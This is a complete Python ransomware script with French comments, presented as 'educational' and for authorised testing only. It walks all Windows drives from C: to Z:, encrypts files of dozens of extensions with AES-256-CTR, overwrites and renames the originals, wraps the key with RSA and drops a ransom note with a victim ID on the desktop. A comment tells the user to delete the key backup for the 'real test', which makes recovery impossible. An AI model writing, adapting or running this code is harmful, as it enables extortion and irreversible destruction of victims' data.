#!/usr/bin/env python3
"""
RANSOMWARE ÉDUCATIF — À utiliser UNIQUEMENT dans un environnement de test autorisé.
Chiffrement AES-256-CTR + RSA-2048 pour la clé de session.
"""

import os
import sys
import json
import base64
from pathlib import Path
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# ==================== CONFIGURATION UTILISATEUR ====================
# Tu modifies ce message comme tu le souhaites
RANSOM_MESSAGE = """
=== VOS FICHIERS ONT ÉTÉ CHIFFRÉS ===

Toutes vos données personnelles et professionnelles ont été chiffrées
avec AES-256-CTR. Aucun outil de récupération gratuit ne pourra les déchiffrer.

Pour récupérer vos fichiers, contactez-nous à : sos@test-pentest.local
Votre identifiant unique : {victim_id}

Ne tentez rien qui pourrait endommager les fichiers.
"""

EXTENSIONS_CIBLES = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.png', '.jpg', '.jpeg', '.bmp', '.gif',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.mp3', '.mp4', '.avi', '.mkv',
    '.py', '.js', '.html', '.css', '.php', '.sql',
    '.db', '.sqlite', '.mdb',
    '.conf', '.cfg', '.ini',
    '.key', '.pem', '.p12',
    '.ovpn', '.rdp',
    '.iso', '.bin',
    '.vmx', '.vmdk', '.vhd',
    '.ps1', '.bat', '.sh',
]

EXCLUSIONS = [
    'windows', 'winnt', 'program files', 'program files (x86)',
    'system32', 'system restore', 'boot', 'recovery',
    'appdata\\local\\temp', 'temp', 'tmp',
    '$recycle.bin', 'system volume information',
    '.cache', 'chrome\\user data',  # laisser les navigateurs fonctionner
]

# ==================== GÉNÉRATION DES CLÉS ====================

def generer_cles_rsa():
    """Génère une paire de clés RSA-2048."""
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key


def generer_cle_aes():
    """Génère une clé AES-256 (32 bytes)."""
    return get_random_bytes(32)

# ==================== CHIFFREMENT ====================

def chiffrer_fichier(chemin, cle_aes):
    """Chiffre un fichier avec AES-256-CTR."""
    try:
        # Générer un nonce (salt) aléatoire
        nonce = get_random_bytes(8)
        cipher = AES.new(cle_aes, AES.MODE_CTR, nonce=nonce)

        with open(chemin, 'rb') as f:
            data = f.read()

        # Sauvegarder le nonce puis les données chiffrées
        encrypted_data = nonce + cipher.encrypt(data)

        # Écraser le fichier original
        with open(chemin, 'wb') as f:
            f.write(encrypted_data)

        # Renommer avec extension .encrypted
        nouveau_nom = chemin + '.encrypted'
        os.rename(chemin, nouveau_nom)
        return True

    except Exception as e:
        print(f"[!] Erreur chiffrement {chemin}: {e}")
        return False


def parcourir_et_chiffrer(repertoire, cle_aes):
    """Parcourt récursivement un répertoire et chiffre les fichiers ciblés."""
    fichiers_chiffres = 0

    for root, dirs, files in os.walk(repertoire):
        # Ignorer les exclusions
        exclure = False
        for excl in EXCLUSIONS:
            if excl.lower() in root.lower():
                exclure = True
                break
        if exclure:
            continue

        for fichier in files:
            chemin = os.path.join(root, fichier)

            # Vérifier l'extension
            ext = os.path.splitext(fichier)[1].lower()
            if ext in EXTENSIONS_CIBLES:
                if chiffrer_fichier(chemin, cle_aes):
                    fichiers_chiffres += 1

    return fichiers_chiffres


def deposer_note_rancon(victim_id):
    """Dépose le message de rançon sur le bureau."""
    try:
        # Chemins possibles pour le bureau
        bureaux = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Bureau"),
            os.path.expanduser("~\\OneDrive\\Desktop"),
        ]

        for bureau in bureaux:
            if os.path.exists(bureau):
                chemin_message = os.path.join(bureau, "README_DECHIFFREMENT.txt")
                contenu = RANSOM_MESSAGE.format(victim_id=victim_id)
                with open(chemin_message, 'w', encoding='utf-8') as f:
                    f.write(contenu)
                print(f"[+] Note de rançon déposée : {chemin_message}")
                break

    except Exception as e:
        print(f"[!] Impossible de déposer la note : {e}")


def main():
    print("[*] Génération des clés RSA...")
    private_key, public_key = generer_cles_rsa()

    print("[*] Génération de la clé AES...")
    cle_aes = generer_cle_aes()

    # Chiffrer la clé AES avec RSA
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(public_key))
    cle_aes_chiffree = rsa_cipher.encrypt(cle_aes)

    # Sauvegarder la clé AES chiffrée (pour le déchiffrement théorique)
    victim_id = base64.b64encode(get_random_bytes(12)).decode('utf-8')[:16]

    infos = {
        'victim_id': victim_id,
        'cle_aes_chiffree': base64.b64encode(cle_aes_chiffree).decode('utf-8'),
        'cle_privee': private_key.decode('utf-8'),
    }

    # Sauvegarder les infos pour le chercheur (à supprimer en production)
    with open('backup_keys.json', 'w') as f:
        json.dump(infos, f, indent=2)
    print(f"[+] INFO : backup_keys.json créé (à supprimer pour le vrai test)")

    # Chiffrer les fichiers
    print("[*] Début du chiffrement...")

    # Chiffrer les lecteurs disponibles (Windows)
    total = 0
    for lettre in range(ord('C'), ord('Z') + 1):
        lecteur = f"{chr(lettre)}:\\"
        if os.path.exists(lecteur):
            print(f"    -> Parcours de {lecteur}...")
            try:
                total += parcourir_et_chiffrer(lecteur, cle_aes)
            except PermissionError:
                print(f"    [!] Permission refusée sur {lecteur}")
                continue

    # Déposer la note
    deposer_note_rancon(victim_id)

    print(f"\n[✓] Terminé ! {total} fichiers chiffrés.")
    print(f"[✓] ID victime : {victim_id}")
    print(f"[✓] Note déposée sur le bureau.")
    print(f"\n⚠️  backup_keys.json contient la clé privée RSA POUR LE DÉCHIFFRAGE.")


if __name__ == '__main__':
    main()